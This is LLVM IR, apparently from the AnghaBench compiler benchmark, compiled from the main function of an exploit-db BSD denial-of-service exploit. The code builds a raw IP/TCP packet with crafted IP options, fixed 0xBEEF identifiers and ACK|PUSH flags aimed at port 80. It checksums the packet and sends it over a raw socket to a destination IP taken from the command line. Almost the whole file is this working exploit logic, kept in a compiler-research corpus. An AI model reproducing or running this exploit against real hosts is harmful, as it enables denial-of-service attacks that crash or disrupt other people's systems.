; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19564.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19564.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ip = type { i32, i32, i32, i32, i32, %struct.TYPE_2__, %struct.TYPE_2__, i64, i64, i8*, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.tcphdr = type { i32, i32, i32, i32, i32, i32, i8*, i8* }

@.str = private unnamed_addr constant [32 x i8] c"Quid custodiet ipsos custodes?\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c"Usage: %s <destination IP>\0A\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@OPTSIZE = common dso_local global i32 0, align 4
@LEN = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i64 0, align 8
@SRC_IP = common dso_local global i32 0, align 4
@IP_SZ = common dso_local global i32 0, align 4
@TH_ACK = common dso_local global i32 0, align 4
@TH_PUSH = common dso_local global i32 0, align 4
@TCP_SZ = common dso_local global i32 0, align 4
@PAYLOAD_LEN = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [15 x i8] c"Sending %s -> \00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"sendto\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i64, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.ip*, align 8
  %10 = alloca %struct.tcphdr*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = call i64 @htonl(i32 1140850689)
  store i64 %11, i64* %5, align 8
  %12 = load i32, i32* %3, align 4
  %13 = icmp ne i32 %12, 2
  br i1 %13, label %14, label %20

14:                                               ; preds = %2
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %16 = load i8**, i8*** %4, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* %18)
  br label %153

20:                                               ; preds = %2
  %21 = call i8* @malloc(i32 1500)
  store i8* %21, i8** %6, align 8
  %22 = load i8*, i8** %6, align 8
  %23 = call i32 @memset(i8* %22, i32 0, i32 1500)
  %24 = call i32 @raw_socket()
  store i32 %24, i32* %7, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %20
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  br label %153

27:                                               ; preds = %20
  %28 = load i8*, i8** %6, align 8
  %29 = bitcast i8* %28 to %struct.ip*
  store %struct.ip* %29, %struct.ip** %9, align 8
  %30 = load %struct.ip*, %struct.ip** %9, align 8
  %31 = getelementptr inbounds %struct.ip, %struct.ip* %30, i32 0, i32 0
  store i32 4, i32* %31, align 8
  %32 = load i32, i32* @OPTSIZE, align 4
  %33 = sdiv i32 %32, 4
  %34 = add nsw i32 5, %33
  %35 = load %struct.ip*, %struct.ip** %9, align 8
  %36 = getelementptr inbounds %struct.ip, %struct.ip* %35, i32 0, i32 1
  store i32 %34, i32* %36, align 4
  %37 = load %struct.ip*, %struct.ip** %9, align 8
  %38 = getelementptr inbounds %struct.ip, %struct.ip* %37, i32 0, i32 2
  store i32 50, i32* %38, align 8
  %39 = load i32, i32* @LEN, align 4
  %40 = call i8* @htons(i32 %39)
  %41 = load %struct.ip*, %struct.ip** %9, align 8
  %42 = getelementptr inbounds %struct.ip, %struct.ip* %41, i32 0, i32 10
  store i8* %40, i8** %42, align 8
  %43 = call i8* @htons(i32 48879)
  %44 = load %struct.ip*, %struct.ip** %9, align 8
  %45 = getelementptr inbounds %struct.ip, %struct.ip* %44, i32 0, i32 9
  store i8* %43, i8** %45, align 8
  %46 = load %struct.ip*, %struct.ip** %9, align 8
  %47 = getelementptr inbounds %struct.ip, %struct.ip* %46, i32 0, i32 3
  store i32 0, i32* %47, align 4
  %48 = load %struct.ip*, %struct.ip** %9, align 8
  %49 = getelementptr inbounds %struct.ip, %struct.ip* %48, i32 0, i32 4
  store i32 255, i32* %49, align 8
  %50 = load i64, i64* @IPPROTO_TCP, align 8
  %51 = load %struct.ip*, %struct.ip** %9, align 8
  %52 = getelementptr inbounds %struct.ip, %struct.ip* %51, i32 0, i32 8
  store i64 %50, i64* %52, align 8
  %53 = load %struct.ip*, %struct.ip** %9, align 8
  %54 = getelementptr inbounds %struct.ip, %struct.ip* %53, i32 0, i32 7
  store i64 0, i64* %54, align 8
  %55 = load i32, i32* @SRC_IP, align 4
  %56 = load %struct.ip*, %struct.ip** %9, align 8
  %57 = getelementptr inbounds %struct.ip, %struct.ip* %56, i32 0, i32 6
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i32 0, i32 0
  store i32 %55, i32* %58, align 8
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @inet_addr(i8* %61)
  %63 = load %struct.ip*, %struct.ip** %9, align 8
  %64 = getelementptr inbounds %struct.ip, %struct.ip* %63, i32 0, i32 5
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 0
  store i32 %62, i32* %65, align 4
  %66 = load i8*, i8** %6, align 8
  %67 = load i32, i32* @IP_SZ, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i32, i32* @OPTSIZE, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = bitcast i8* %72 to %struct.tcphdr*
  store %struct.tcphdr* %73, %struct.tcphdr** %10, align 8
  %74 = call i8* @htons(i32 80)
  %75 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %76 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %75, i32 0, i32 7
  store i8* %74, i8** %76, align 8
  %77 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %78 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %77, i32 0, i32 0
  store i32 48879, i32* %78, align 8
  %79 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %80 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %79, i32 0, i32 1
  store i32 305419896, i32* %80, align 4
  %81 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %82 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %81, i32 0, i32 2
  store i32 -2023406815, i32* %82, align 8
  %83 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %84 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %83, i32 0, i32 3
  store i32 5, i32* %84, align 4
  %85 = load i32, i32* @TH_ACK, align 4
  %86 = load i32, i32* @TH_PUSH, align 4
  %87 = or i32 %85, %86
  %88 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %89 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %88, i32 0, i32 4
  store i32 %87, i32* %89, align 8
  %90 = call i8* @htons(i32 8192)
  %91 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %92 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %91, i32 0, i32 6
  store i8* %90, i8** %92, align 8
  %93 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 5
  store i32 0, i32* %94, align 4
  %95 = load i8*, i8** %6, align 8
  %96 = load i32, i32* @IP_SZ, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = bitcast i64* %5 to i8*
  %100 = load i32, i32* @OPTSIZE, align 4
  %101 = call i32 @memcpy(i8* %98, i8* %99, i32 %100)
  %102 = load %struct.ip*, %struct.ip** %9, align 8
  %103 = getelementptr inbounds %struct.ip, %struct.ip* %102, i32 0, i32 6
  %104 = bitcast %struct.TYPE_2__* %103 to i16*
  %105 = call i32 @checksum(i16* %104, i32 8)
  %106 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %107 = bitcast %struct.tcphdr* %106 to i16*
  %108 = load i32, i32* @TCP_SZ, align 4
  %109 = load i32, i32* @PAYLOAD_LEN, align 4
  %110 = add nsw i32 %108, %109
  %111 = call i32 @checksum(i16* %107, i32 %110)
  %112 = add nsw i32 %105, %111
  %113 = load i64, i64* @IPPROTO_TCP, align 8
  %114 = load i32, i32* @TCP_SZ, align 4
  %115 = sext i32 %114 to i64
  %116 = add nsw i64 %113, %115
  %117 = call i32 @ntohs(i64 %116)
  %118 = add nsw i32 %112, %117
  store i32 %118, i32* %8, align 4
  br label %119

119:                                              ; preds = %123, %27
  %120 = load i32, i32* %8, align 4
  %121 = ashr i32 %120, 16
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %129

123:                                              ; preds = %119
  %124 = load i32, i32* %8, align 4
  %125 = and i32 %124, 65535
  %126 = load i32, i32* %8, align 4
  %127 = ashr i32 %126, 16
  %128 = add nsw i32 %125, %127
  store i32 %128, i32* %8, align 4
  br label %119

129:                                              ; preds = %119
  %130 = load i32, i32* %8, align 4
  %131 = xor i32 %130, -1
  %132 = load %struct.tcphdr*, %struct.tcphdr** %10, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 5
  store i32 %131, i32* %133, align 4
  %134 = load %struct.ip*, %struct.ip** %9, align 8
  %135 = getelementptr inbounds %struct.ip, %struct.ip* %134, i32 0, i32 6
  %136 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = call i8* @inet_ntoa(i32 %137)
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i8* %138)
  %140 = load %struct.ip*, %struct.ip** %9, align 8
  %141 = getelementptr inbounds %struct.ip, %struct.ip* %140, i32 0, i32 5
  %142 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 4
  %144 = call i8* @inet_ntoa(i32 %143)
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %144)
  %146 = load i32, i32* %7, align 4
  %147 = load i8*, i8** %6, align 8
  %148 = load i32, i32* @LEN, align 4
  %149 = call i32 @write_raw(i32 %146, i8* %147, i32 %148)
  %150 = load i32, i32* @LEN, align 4
  %151 = icmp ne i32 %149, %150
  br i1 %151, label %152, label %153

152:                                              ; preds = %129
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %153

153:                                              ; preds = %14, %26, %152, %129
  ret void
}

declare dso_local i64 @htonl(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @raw_socket() #1

declare dso_local void @perror(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @checksum(i16*, i32) #1

declare dso_local i32 @ntohs(i64) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @write_raw(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
